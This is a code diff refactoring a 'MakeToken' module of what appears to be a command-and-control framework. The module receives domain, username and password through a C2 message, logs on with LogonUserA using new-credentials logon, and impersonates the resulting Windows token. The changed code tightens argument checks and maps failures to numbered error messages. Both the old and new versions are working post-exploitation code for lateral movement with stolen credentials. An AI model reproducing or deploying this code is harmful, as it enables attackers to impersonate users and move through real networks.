@@ -2,7 +2,6 @@
 
 #include <cstring>
 
-#include "Tools.hpp"
 #include "Common.hpp"
 
 #ifdef __linux__
@@ -117,77 +116,53 @@ int MakeToken::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 int MakeToken::process(C2Message &c2Message, C2Message &c2RetMessage)
 {
     const std::string cmd = c2Message.cmd();
+    std::vector<std::string> fields;
+    splitList(cmd, ";", fields);
 
-    std::vector<std::string> splitedList;
-    splitList(cmd, ";", splitedList);
-
-    c2RetMessage.set_instruction(c2RetMessage.instruction());
+    c2RetMessage.set_instruction(c2Message.instruction());
     c2RetMessage.set_cmd(cmd);
+    c2RetMessage.set_returnvalue("");
 
-    if(splitedList.size() < 3)
+    if (fields.size() != 3 || fields[1].empty() || fields[2].empty())
     {
-        c2RetMessage.set_errorCode(ERROR_INVALID_ARGS);
+        c2RetMessage.set_errorCode(1);
         return 0;
     }
 
-    std::string domain=splitedList[0];
-    std::string username=splitedList[1];
-    std::string password=splitedList[2];
-
-    std::string out = makeToken(username, domain, password);
-
-    c2RetMessage.set_returnvalue(out);
-    return 0;
-}
-
-//https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-logonusera
-//https://cpp.hotexamples.com/fr/examples/-/-/LogonUserA/cpp-logonusera-function-examples.html
-//https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser
-//https://docs.microsoft.com/en-us/windows/win32/secauthz/client-impersonation
-// https://github.com/rapid7/meterpreter/blob/master/source/extensions/kiwi/mimikatz/modules/kuhl_m_token.c
-std::string MakeToken::makeToken(const std::string& username, const std::string& domain, const std::string& password)
-{
-    std::string result;
-
-#ifdef __linux__ 
-
-    result += "MakeToken don't work in linux.\n";
-
-#elif _WIN32
-
-    HANDLE tokenHandle;
-    if(LogonUserA(username.c_str(), domain.c_str(), password.c_str(), LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &tokenHandle))
+#ifdef _WIN32
+    HANDLE tokenHandle = nullptr;
+    if (!LogonUserA(fields[1].c_str(), fields[0].c_str(), fields[2].c_str(),
+            LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &tokenHandle))
     {
-        result += "User logged in successfully.\n";
-        if (ImpersonateLoggedOnUser(tokenHandle))
-        {
-            result += "Impersonate token successfully.\n";
-        }
-        else
-        {
-            result += "Fail to impersonate token.\n";
-        }
-
-        CloseHandle(tokenHandle);
+        c2RetMessage.set_errorCode(2);
+        return 0;
     }
-    else
+    const BOOL impersonated = ImpersonateLoggedOnUser(tokenHandle);
+    CloseHandle(tokenHandle);
+    if (!impersonated)
     {
-        result += "Unable to login.\n";
+        c2RetMessage.set_errorCode(3);
+        return 0;
     }
-
+    c2RetMessage.set_errorCode(0);
+    c2RetMessage.set_returnvalue("User logged in and token impersonated successfully.\n");
+#else
+    c2RetMessage.set_errorCode(4);
 #endif
-
-        return result;
+    return 0;
 }
 
 int MakeToken::errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg)
 {
 #if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS)
-    int errorCode = c2RetMessage.errorCode();
-    if(errorCode > 0)
+    switch (c2RetMessage.errorCode())
     {
-        if(errorCode == ERROR_INVALID_ARGS)
-            errorMsg = "Failed: Invalid arguments";
+    case 0: errorMsg.clear(); break;
+    case 1: errorMsg = "Failed: Invalid arguments"; break;
+    case 2: errorMsg = "Failed to log on with the supplied credentials."; break;
+    case 3: errorMsg = "Failed to impersonate the new token."; break;
+    case 4: errorMsg = "MakeToken is only supported on Windows."; break;
+    default: errorMsg = "MakeToken failed with an unknown error."; break;
     }
 #endif
     return 0;
